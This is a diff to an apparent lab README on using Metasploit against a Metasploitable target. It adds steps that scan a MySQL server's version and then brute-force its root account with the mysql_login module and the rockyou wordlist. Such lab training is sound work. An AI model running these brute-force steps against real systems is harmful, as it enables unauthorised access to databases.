@@ -60,6 +60,49 @@ udo service postgresql start
 ```
 ![image](https://github.com/Hariharan-061102/Metasploit-for-reconnaissance/assets/93427270/0003c106-bc07-4cf0-ace2-1c7b2bb70505)
 
+Use the search option to look for an auxiliary module to scan and enumerate the MySQL database.
+```
+search type:auxiliary mysql
+```
+## OUTPUT:
+![image](https://github.com/Hariharan-061102/Metasploit-for-reconnaissance/assets/93427270/b334ac2c-ad84-4b97-b945-489ff3d08440)
+
+use the auxiliary/scanner/mysql/mysql_version module by typing the module name or associated number to scan MySQL version details.
+```
+use 11
+```
+or 
+```
+use auxiliary/scanner/mysql/mysql_version
+```
+## OUTPUT:
+![image](https://github.com/Hariharan-061102/Metasploit-for-reconnaissance/assets/93427270/74491c26-92b0-4fc3-a535-0a7aa51ef167)
+
+Use the set rhosts command to set the parameter and run the module, as follows:
+```
+set rhosts 192.168.120.142
+```
+## OUTPUT:
+![image](https://github.com/Hariharan-061102/Metasploit-for-reconnaissance/assets/93427270/1b27bf3a-cc98-4638-b6cc-ee7e494e5b75)
+
+After scanning, you can also brute force MySQL root account via Metasploit's auxiliary(scanner/mysql/mysql_login) module.
+
+## OUTPUT:
+![image](https://github.com/Hariharan-061102/Metasploit-for-reconnaissance/assets/93427270/d1f21e01-bd40-4bbb-82ff-0b3d760d6c9c)
+
+set the PASS_FILE parameter to the wordlist path available inside /usr/share/wordlists
+```
+set PASS_FILE /usr/share/wordlistss/rockyou.txt
+```
+Then, specify the IP address of the target machine with the RHOSTS command.
+```
+set RHOSTS <metasploitable-ip-address>
+```
+Set BLANK_PASSWORDS to true in case there is no password set for the root account.
+```
+set BLANK_PASSWORDS true
+```
+## OUTPUT:
 
 
 ## RESULT:
